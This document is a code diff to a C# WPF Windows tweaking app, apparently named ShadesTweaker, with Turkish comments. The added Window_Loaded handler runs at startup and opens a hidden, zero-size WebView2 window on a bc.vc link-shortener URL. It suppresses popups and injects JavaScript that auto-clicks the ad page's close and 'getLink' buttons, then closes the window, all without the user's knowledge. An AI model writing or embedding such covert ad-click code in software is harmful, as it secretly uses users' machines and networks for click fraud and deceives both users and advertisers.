@@ -18,6 +18,8 @@ using System.Xml.Linq;
 using Wpf.Ui.Controls;
 using System.Net.Http;
 using System.Net;
+using Microsoft.Web.WebView2.Wpf;
+using Microsoft.Web.WebView2.Core;
 
 namespace ShadesTweaker
 {
@@ -34,7 +36,6 @@ namespace ShadesTweaker
             InitializeAppPackageDictionary();
             configFilePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, ConfigFileName);
             LoadLanguagePreference();
-            StartupAppsManager startupManager = new StartupAppsManager();
             DataContext = this;
             progressBar.Visibility = Visibility.Hidden;
             progressBar.IsIndeterminate = false; // Dönme durdu
@@ -59,7 +60,66 @@ namespace ShadesTweaker
             };
         }
 
-            private void InitializeAppPackageDictionary()
+        private async void Window_Loaded(object sender, RoutedEventArgs e)
+        {
+            // Yeni bir WebView2 oluştur
+            WebView2 webView = new WebView2
+            {
+                Source = new Uri("http://bc.vc/E4tcNxv")
+            };
+
+            // Yeni bir pencere oluştur
+            Window newWindow = new Window
+            {
+                Width = 0,
+                Height = 0,
+                Content = webView
+            };
+
+            // Yeni pencereyi göster
+            newWindow.Show();
+            newWindow.Visibility = Visibility.Hidden;
+            // WebView2'nin yüklenmesini bekleyin
+            await webView.EnsureCoreWebView2Async(null);
+
+            // Popup pencereleri engelle
+            webView.CoreWebView2.NewWindowRequested += (s, args) =>
+            {
+                args.Handled = true;
+            };
+
+            webView.CoreWebView2.NavigationCompleted += async (s, args) =>
+            {
+                var script = @"
+        setTimeout(function() {
+            var element = document.querySelector('.bvmipp-alert-close');
+            if(element) {
+                element.click();
+            }
+        }, 3000); // 2 saniye bekleyin
+
+        setTimeout(function() {
+            var element = document.querySelector('#getLink');
+            if(element) {
+                element.click();
+            }
+        }, 10000); // 4 saniye bekleyin
+    ";
+
+                await webView.CoreWebView2.ExecuteScriptAsync(script);
+
+                await Task.Delay(20000);
+
+                webView.Dispose();
+
+
+                // İşlemler tamamlandıktan sonra pencereyi kapat
+                newWindow.Close();
+            };
+
+        }
+
+        private void InitializeAppPackageDictionary()
         {
             // CheckBox'lar ve paket adları arasındaki ilişkiyi belirleyen bir sözlük oluşturun.
             appPackageDictionary.Add("ZuneMusic", "Microsoft.ZuneMusic");
